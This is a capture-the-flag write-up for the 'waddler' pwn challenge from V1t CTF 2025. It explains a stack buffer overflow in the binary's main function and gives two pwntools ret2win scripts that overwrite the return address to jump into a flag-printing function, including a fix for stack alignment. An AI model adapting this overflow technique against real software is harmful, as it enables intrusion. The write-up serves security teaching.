# V1t CTF 2025: waddler

Author: Gabriel Sherman

## Description

* Category: pwn
* Point value: 100

> Poke it the right way and it hums back something useful.

Files:

* [chall](chall)
* [flag.txt](flag.txt)

## Tools used

* `gdb`
* `pwntools`
* `ghidra`
* `objdump`

## Initial Analysis

My typical first step when it comes to approaching a pwn challenge is to disassemble the binary with `objdump` and decompile it `ghidra`. 
This helps us get an idea of both the lower-level and higher-level properties of the program.

Here in the `objdump` output, we see a function called `duck` exists, but `main` doesn't call it. 
```
000000000040128c <duck>:
  40128c:	f3 0f 1e fa          	endbr64 
  401290:	55                   	push   %rbp
  401291:	48 89 e5             	mov    %rsp,%rbp
  401294:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
  40129b:	48 8d 05 62 0d 00 00 	lea    0xd62(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
  ....


  0000000000401385 <main>:
  401385:	f3 0f 1e fa          	endbr64 
  401389:	55                   	push   %rbp
  40138a:	48 89 e5             	mov    %rsp,%rbp
  40138d:	48 83 ec 40          	sub    $0x40,%rsp
  401391:	48 8d 05 a9 0c 00 00 	lea    0xca9(%rip),%rax        # 402041 <_IO_stdin_used+0x41>
  401398:	48 89 c7             	mov    %rax,%rdi
  40139b:	e8 20 fd ff ff       	call   4010c0 <_init+0xc0>
  4013a0:	48 8b 15 c9 2c 00 00 	mov    0x2cc9(%rip),%rdx        # 404070 <stdin@GLIBC_2.2.5>
  4013a7:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
  4013ab:	be 50 00 00 00       	mov    $0x50,%esi
  4013b0:	48 89 c7             	mov    %rax,%rdi
  4013b3:	e8 68 fd ff ff       	call   401120 <_init+0x120>
  4013b8:	b8 00 00 00 00       	mov    $0x0,%eax
  4013bd:	c9                   	leave  
  4013be:	c3                   	ret    
```
Using `ghidra`, we can see that `duck` reads the flag and prints it out. This is our target!
```
void duck(void)
{
  char *pcVar1;
  undefined8 uStack_120;
  char local_118 [256];
  size_t local_18;
  FILE *local_10;
  
  uStack_120 = 0x4012b4;
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    uStack_120 = 0x4012ce;
    puts("flag file not found");
    uStack_120 = 0x4012d8;
    FUN_00401140(1);
  }
  uStack_120 = 0x4012f0;
  pcVar1 = fgets(local_118,0x100,local_10);
  if (pcVar1 == (char *)0x0) {
    uStack_120 = 0x401304;
    puts("failed to read flag");
    uStack_120 = 0x401310;
    fclose(local_10);
    uStack_120 = 0x40131a;
    FUN_00401140(1);
  }
  uStack_120 = 0x401326;
  fclose(local_10);
  uStack_120 = 0x401335;
  local_18 = strlen(local_118);
  if ((local_18 != 0) && (local_118[local_18 - 1] == '\n')) {
    local_118[local_18 - 1] = '\0';
  }
  uStack_120 = 0x401382;
  printf("FLAG: %s\n",local_118);
  return;
}
```
Furthermore, we can see that main is reading 80 (0x50) bytes into a 64 byte buffer through the call to `fgets`.
This opens up the door for exploitation!
```
undefined8 main(void)
{
  char local_48 [64];
  
  puts("The Ducks are coming!");
  fgets(local_48,0x50,stdin);
  return 0;
}
```
This is a classic ret2win challenge! (i.e., modify the stack so that `main` returns to the target function and leaks the flag)

## Solution
So if we sketch out the state of the stack when the overflow occurs, this is what we see:

```
-----------------------------------------
|        return address [8 bytes]       |
-----------------------------------------
|      $RBP (frame pointer) [8 bytes]   |
-----------------------------------------
|   local_48 (string buffer) [64 bytes] |
-----------------------------------------
```

My initial approach was to simply overwrite the next two values on the stack, such that `%RBP` could be 
set to any value, and the next value on the stack would contain the address of `duck (000000000040128c)`.
That way, once the `main` function finished, it would jump into the beginning of `duck`!

Initial Script:
```
from pwn import *
p = process("./chall")

p.recvline()

offset = 64

buffer = b'A'* offset
rbp = b'A'* 8
duck_addr = p64(0x0040128c)

payload = buffer + rbp + duck_addr
open("payload.txt", "wb").write(payload)

p.sendline(payload)
p.interactive()
```

After executing this, I was getting some unexpected segfaults, so I decided to turn to gdb to see if it could offer any insight:
```
$ gdb chal
$ r < payload.txt

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7ca44c0 in _int_malloc (av=av@entry=0x7ffff7e1ac80 <main_arena>, bytes=bytes@entry=640) at ./malloc/malloc.c:4375
```
This is a weird error! Luckily, as Carson pointed out, a seg fault inside a standard library function such as `malloc` often indicates that the stack is not correctly aligned. The calling convention requires the stack pointer to be aligned to a 16-byte boundary before function entry. If the function is called while `$ESP % 16 != 0`, the misalignment can lead to a segfault.

We must realign the stack, and there are two approaches:
1. Add an extra `ret` gadget to the ROP chain. Because `ret` pops an 8-byte value from the stack, inserting a ret adjusts the stack pointer by one slot so subsequent frames are aligned. Having execution hit a ret before jumping to our target accomplishes the required alignment.

2. Skip the `push %rbp` instruction in `duck`. In practice omitting that push rarely breaks the function under test and avoids adding an 8-byte value to the stack.

Since we can only overwrite two stack values, we cannot add another `ret`. The solution here is to jump to the instruction immediately after `push %rbp` in duck — i.e., 

`401291: 48 89 e5 mov %rsp,%rbp` 

This yields the correct alignment without consuming an additional stack slot.

So, our final script is now:
```
from pwn import *
p = process("./chall")

p.recvline()

offset = 64

buffer = b'A'* offset
rbp = b'A'* 8
duck_after_push_rbp = p64(0x00401291)

payload = buffer + rbp + duck_after_push_rbp
open("payload.txt", "wb").write(payload)

p.sendline(payload)
p.interactive()
```

Success!
```
$ python3 exploit.py
[+] Starting local process './chall': pid 19229
[*] Switching to interactive mode
FLAG: v1t{w4ddl3r_3x1t5_4e4d6c332b6fe62a63afe56171fd3725}
The Ducks are coming!
[*] Got EOF while reading in interactive
```
